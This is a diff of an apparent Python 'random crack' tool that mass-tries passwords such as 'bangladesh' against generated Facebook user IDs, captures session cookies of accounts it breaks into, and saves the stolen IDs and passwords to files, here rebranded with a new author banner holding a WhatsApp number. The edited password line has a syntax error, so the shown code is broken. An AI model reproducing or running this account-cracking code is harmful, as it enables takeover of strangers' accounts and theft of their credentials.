@@ -2,7 +2,6 @@
 #Don't Forget To Follow My Github &
 #Sent Star This Repositories 🙂
 #-------------------------------------------------------------
-#10K-Gift-Test-Coding
 #!/usr/bin/python3
 #-*-coding:utf-8-*-
 import os,sys,time,json,random,re,string,platform,base64,uuid
@@ -131,18 +130,23 @@ class jalan:
             time.sleep(0.001)
 #-----[Logo]-----#
 logo = ("""
-\033[1;91m    _____   ___   ______  _____________   ________
-\033[1;92m   /  _/ | / / | / / __ \/ ____/ ____/ | / /_  __/
-\033[1;93m   / //  |/ /  |/ / / / / /   / __/ /  |/ / / /   
-\033[1;94m _/ // /|  / /|  / /_/ / /___/ /___/ /|  / / /    
-\033[1;95m/___/_/ |_/_/ |_/\____/\____/_____/_/ |_/ /_/     \033[1;92m
- ┌─────────────────────────────────────────┐
- │ [✓] AUTHOR   : MUMIT ISLAM HIMU         │
- │ [✓] TOOL     : RANDOM CRACK             │
- │ [✓] STATUS   : FREE                     │
- │ [✓] GITHUB   : MUMIT-404-CYBER          │
- │ [✓] FACEBOOK : MUMIT ISLAM              │
- └─────────────────────────────────────────┘""")
+\33[1;32m                      \33[1;31m __  ___  
+    \33[1;32m /\               \33[1;31m/_ |/ _ \ 
+    \33[1;32m/  \   __  __\33[1;33m______\33[1;31m| | | | |
+   \33[1;32m/ /\ \  \ \/ /\33[1;33m______\33[1;31m| | | | |
+  \33[1;32m/ ____ \  >  <       \33[1;31m| | |_| |
+ \33[1;32m/_/    \_\/_/\_\      \33[1;31m|_|\___/ 
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
+\33[1;32m╔════════════════════════════════════════╗
+\33[1;32m║\33[1;31m[\33[1;32m•\33[1;31m] \33[1;33mAuthor    \33[1;31m: \33[1;32mAjijul Hakim            \33[1;32m║
+\33[1;32m║\33[1;31m[\33[1;32m•\33[1;31m] \33[1;93mFacebook  \33[1;31m: \33[1;32mAjijul Hakim            \33[1;32m║
+\33[1;32m║\33[1;31m[\33[1;32m•\33[1;31m] \33[1;93mWhatsapp  \33[1;31m: \33[1;32m+8801768993745          \33[1;32m║
+\33[1;32m║\33[1;31m[\33[1;32m•\33[1;31m] \33[1;93mGithub    \33[1;31m: \33[1;32mAHK Hakim               \33[1;32m║
+\33[1;32m║\33[1;31m[\33[1;32m•\33[1;31m] \33[1;93mStatus    \33[1;31m: \33[1;32mFree                    \33[1;32m║
+\33[1;32m║\33[1;31m[\33[1;32m•\33[1;31m] \33[1;93mNetwork   \33[1;31m: \33[1;32m3G,4G/5G,               \33[1;32m║
+\33[1;32m║\33[1;31m[\33[1;32m•\33[1;31m] \33[1;93mVersion   \33[1;31m: \33[1;32m1.0                     \33[1;32m║
+\33[1;32m║\33[1;31m[\33[1;32m•\33[1;31m] \33[1;93mTools     \33[1;31m: \33[1;32mAx-Pro                  \33[1;32m║
+\33[1;32m╚════════════════════════════════════════╝""")
 try:
    print('\n\n\033[1;33mLOADING ASSET FILES ... \033[0;97m')
    v = 5.2
@@ -154,7 +158,7 @@ try:
 except:print('\n\033[1;31mNO INTERNET CONNECTION ... \033[0;97m')
 
 def linex():
-        print('\033[1;37m ──────────────────────────────────────────')
+        print('\033[1;37m ══════════════════════════════════════════')
  
 def clear():
     os.system('clear')
@@ -205,13 +209,13 @@ def innocent():
         print('\033[1;92m [+] Crack Process Has Started')
         print('\033[1;92m [!] Use Flight Mode For Speed Up')
         linex()
-        for fuck in user:
-            pwx = [fuck,'bangladesh']
-            uid = code+fuck
+        for love in user:
+            pwx = [love[1:]'bangladesh']
+            uid = code+love
             ahare.submit(mumitx,uid,pwx,tl)
     print('CRACK PROCESS HAS BEEN COMPLETED ')
-    print('Ok Ids Saved in /INNOCENT-OK.txt')
-    print('Cp Ids Saved in /INNOCENT-CP.txt')
+    print('Ok Ids Saved in /Ax-Pro-OK.txt')
+    print('Cp Ids Saved in /Ax-Pro-CP.txt')
     linex()
     
 def mumitx(uid,pwx,tl):
@@ -257,18 +261,18 @@ def mumitx(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\r\033[1;32m[INNOCENT-OK] ' +uid+ ' | ' +ps+ ' \033[0;97m')
+                print('\r\r\033[1;32m[Ax-Pro-OK] ' +uid+ ' | ' +ps+ ' \033[0;97m')
                 print('\033[1;32m[COOKIE] = \033[1;37m'+coki+ '')
                 cek_apk(session,coki)
-                open('/sdcard/INNOCENT-OK.txt', 'a').write( cid+' | '+ps+'\n')
+                open('/sdcard/Ax-Pro-OK.txt', 'a').write( cid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
                 if 'y' in cp_cpx: 
-                 print('\r\r\033[1;30m[INNOCENT-CP]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
-                open('/sdcard/INNOCENT-CP.txt', 'a').write( cid+' | '+ps+' \n')
+                 print('\r\r\033[1;30m[Ax-Pro-CP]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
+                open('/sdcard/Ax-Pro-CP.txt', 'a').write( cid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
